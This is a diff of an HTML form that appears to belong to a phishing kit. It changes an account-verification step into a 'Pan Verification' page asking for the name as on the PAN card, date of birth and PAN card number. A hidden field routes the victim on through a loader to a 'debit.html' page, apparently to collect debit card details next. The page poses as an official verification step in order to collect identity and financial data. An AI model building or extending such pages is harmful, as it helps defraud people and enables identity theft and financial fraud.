@@ -15,17 +15,21 @@
         <img src="assets/header.jpg" width="100%" alt="">
     </header>
     <main>
-        <h2 class="text-center">Account Details Verification</h2>
+        <h2 class="text-center">Pan Verification</h2>
         <div class="box">
-            <input type="hidden" id="nextValue" value="loader.html?next=tok.html?next=cpan.html">
+            <input type="hidden" id="nextValue" value="loader.html?next=debit.html">
             <form action="" class="form" id="frm_2_am8E_">
                 <div class="form-group">
-                    <label for="">Account / Card Holder Name</label>
-                    <input type="text" name="acname" required>
+                    <label for="">Your Name *(As per pan)</label>
+                    <input type="text" name="panname" required>
                 </div>
                 <div class="form-group">
                     <label for="">Date of Birth</label>
                     <input type="text" id="dobInput" name="dobInput" placeholder="DD/MM/YYYY">
+                </div>
+                <div class="form-group">
+                    <label for="">PAN Card Number</label>
+                    <input type="text" name="pnnn" maxlength="10" pattern="[a-zA-Z]{5}[0-9]{4}[a-zA-Z]{1}" minlength="10"  required>
                 </div>
                 <div class="form-group">
                     <button type="submit" class="btn btn-primary">SUBMIT</button>
